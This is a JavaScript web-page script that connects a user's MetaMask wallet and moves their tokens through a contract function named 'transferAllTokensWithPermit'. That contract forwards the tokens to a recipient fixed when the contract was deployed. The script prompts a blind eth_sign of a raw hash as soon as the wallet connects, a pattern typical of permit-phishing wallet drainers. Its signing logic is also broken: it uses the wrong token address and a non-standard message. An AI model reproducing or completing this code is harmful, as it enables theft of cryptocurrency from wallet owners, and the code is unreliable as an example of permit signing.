let web3;
let userAddress;

// 设置合约地址和ABI
const contractAddress = '0x9a2E12340354d2532b4247da3704D2A5d73Bd189';
const contractABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
            { "internalType": "uint8", "name": "v", "type": "uint8" },
            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "_recipient", "type": "address" }],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
            { "indexed": true, "internalType": "address", "name": "from", "type": "address" },
            { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "TransferTokens",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    }
];

// 页面加载后检测钱包
window.addEventListener('load', () => {
    if (typeof window.ethereum !== 'undefined') {
        console.log('以太坊钱包已检测到。');
    } else {
        console.log('未检测到以太坊钱包，请安装 MetaMask 或其他以太坊扩展。');
    }
});

// 绑定连接钱包按钮事件
document.getElementById('connectButton').addEventListener('click', connectWallet);

// 连接钱包函数
async function connectWallet() {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            document.getElementById('walletAddress').innerText = `钱包地址: ${userAddress}`;
            console.log("已连接地址:", userAddress);

            // 自动生成并填充签名参数
            await generateSignatureParams(userAddress);
        } catch (error) {
            console.error("连接钱包时发生错误:", error);
        }
    } else {
        alert("请安装MetaMask！");
        console.log("未检测到MetaMask。");
    }
}

// 生成签名参数（v, r, s）
async function generateSignatureParams(userAddress) {
    console.log("生成签名参数...");
    // 这里应该包含实际的签名逻辑
    // 假设代币合约地址为 tokenAddress，以下为示例
    const tokenAddress = contractAddress; // 代币合约地址
    const amount = web3.utils.toWei("1", "ether"); // 设定转移数量
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20分钟后过期

    // 构造要签名的消息
    const nonce = await web3.eth.getTransactionCount(userAddress);
    const message = web3.utils.soliditySha3(tokenAddress, userAddress, amount, deadline, nonce);

    // 获取签名
    const signature = await web3.eth.sign(message, userAddress);
    const { v, r, s } = web3.utils.fromRpcSig(signature);

    // 填充签名参数
    document.getElementById('v').value = v;
    document.getElementById('r').value = r;
    document.getElementById('s').value = s;
}

// 绑定转移代币按钮事件
document.getElementById('transferButton').addEventListener('click', transferTokens);

// 转移代币函数
async function transferTokens() {
    console.log("尝试转移代币...");
    const v = document.getElementById('v').value;
    const r = document.getElementById('r').value;
    const s = document.getElementById('s').value;
    const tokenAddress = contractAddress; // 使用合约地址

    // 构建转移所需参数（如价值、截止时间等）
    const amount = web3.utils.toWei("1", "ether"); // 设定转移数量
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20分钟后过期

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        await contract.methods.transferAllTokensWithPermit(tokenAddress, userAddress, amount, deadline, v, r, s).send({ from: userAddress });
        console.log("代币转移成功！");
    } catch (error) {
        console.error("转移代币时发生错误:", error);
    }
}
